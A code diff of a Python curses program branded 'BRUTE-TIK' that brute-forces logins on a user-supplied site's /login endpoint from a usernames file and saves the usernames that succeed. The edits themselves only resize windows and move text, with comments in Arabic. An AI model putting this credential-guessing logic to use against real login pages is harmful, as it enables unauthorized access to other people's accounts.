@@ -24,9 +24,8 @@ def get_user_input(stdscr, prompt, y, x):
     uly = y
     ulx = x - 1
     lry = y + 2
-    lrx = x + 61
+    lrx = x + 21  # تصغير العرض إلى 21 بدلاً من 31
 
-    # Log the coordinates and terminal size for debugging
     max_y, max_x = stdscr.getmaxyx()
     print(f"Rectangle coordinates: (uly: {uly}, ulx: {ulx}, lry: {lry}, lrx: {lrx})")
     print(f"Terminal size: (max_y: {max_y}, max_x: {max_x})")
@@ -37,7 +36,7 @@ def get_user_input(stdscr, prompt, y, x):
         stdscr.getch()
         return ""
 
-    input_field = curses.newwin(1, 60, y + 1, x)
+    input_field = curses.newwin(1, 20, y + 1, x)  # تصغير عرض النافذة إلى 20 بدلاً من 30
     textpad.rectangle(stdscr, uly, ulx, lry, lrx)
     stdscr.refresh()
     input_field.refresh()
@@ -63,7 +62,6 @@ def bruteforce_login(stdscr):
     stdscr.refresh()
 
     logo = """
-      
 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗ ████████╗██╗██╗  ██╗
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝ ╚══██╔══╝██║██║ ██╔╝
 ██████╔╝██████╔╝██║   ██║   ██║   █████╗█████╗██║   ██║█████╔╝ 
@@ -72,11 +70,11 @@ def bruteforce_login(stdscr):
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝   ╚═╝╚═╝  ╚═╝
     """
 
-    stdscr.addstr(2, 0, logo ,curses.color_pair(1))
+    stdscr.addstr(2, 0, logo, curses.color_pair(1))
     stdscr.refresh()
-    stdscr.addstr(14, 15, " >>> Developed by [Abdullah Bawhab]", curses.color_pair(3))
+    stdscr.addstr(12, 5, ">>> Developed by [Abdullah Bawhab]", curses.color_pair(3))  # تقليل الإزاحة الأفقية
     stdscr.refresh()
-    stdscr.addstr(15, 20, " #Instagram : [etuadmin]", curses.color_pair(1))
+    stdscr.addstr(13, 10, "#Instagram : [etuadmin]", curses.color_pair(1))  # تقليل الإزاحة الأفقية
     stdscr.refresh()
     time.sleep(3)
     stdscr.clear()
@@ -86,15 +84,15 @@ def bruteforce_login(stdscr):
     stdscr.getch()
 
     stdscr.clear()
-    stdscr.addstr(3, 2, "Enter URL (e.g., http://example.net) >>>  ", curses.color_pair(1))
+    stdscr.addstr(2, 2, "Enter URL (e.g., http://example.net) >>> ", curses.color_pair(1))
     stdscr.refresh()
-    url = get_user_input(stdscr, "", 2, 43).strip()
+    url = get_user_input(stdscr, "", 2, 35).strip()  # تقليل الإزاحة الأفقية
     login_url = f'{url}/login'
     status_url = f'{url}/status?var=callBack'
     logout_url = f'{url}/logout'  # Adding the logout URL
 
     stdscr.clear()
-    stdscr.addstr(3, 2, "Enter usernames file name >>> ", curses.color_pair(1))
+    stdscr.addstr(2, 2, "Enter usernames file name >>> ", curses.color_pair(1))
     stdscr.refresh()
     username_file = get_user_input(stdscr, "", 2, 33).strip()
     password = ''
@@ -113,7 +111,7 @@ def bruteforce_login(stdscr):
     stdscr.refresh()
 
     start_time = time.time()
-    timer_win = curses.newwin(1, 60, 0, 0)
+    timer_win = curses.newwin(1, 20, 0, 0)  # تصغير عرض النافذة إلى 20 بدلاً من 30
     threading.Thread(target=update_timer, args=(stdscr, start_time, timer_win), daemon=True).start()
 
     stdscr.addstr(2, 2, "Starting brute-force attack...\n\n", curses.color_pair(1))
@@ -124,7 +122,7 @@ def bruteforce_login(stdscr):
     ua_loader.join()
 
     try:
-        attempts = 1 
+        attempts = 1
         with open(username_file, 'r') as file:
             for line in file:
                 username = line.strip()
@@ -150,11 +148,11 @@ def bruteforce_login(stdscr):
                     try:
                         response_data = status_response.json()
                     except ValueError:
-                        stdscr.move(5, 0)  
-                        stdscr.clrtoeol()  
+                        stdscr.move(5, 0)
+                        stdscr.clrtoeol()
                         stdscr.addstr(f'Attempt {attempts}: Username is : {username}', curses.color_pair(3))  # Print attempts number and username
                         stdscr.refresh()
-                        attempts += 1  
+                        attempts += 1
                         continue
 
                     if response_data.get("logged_in") == "yes":
@@ -162,7 +160,7 @@ def bruteforce_login(stdscr):
                         for char in success_message:
                             stdscr.addstr(char, curses.color_pair(2))
                             stdscr.refresh()
-                            time.sleep(0.1)  
+                            time.sleep(0.1)
 
                         with open('results.txt', 'a') as results_file:
                             results_file.write(username + '\n')
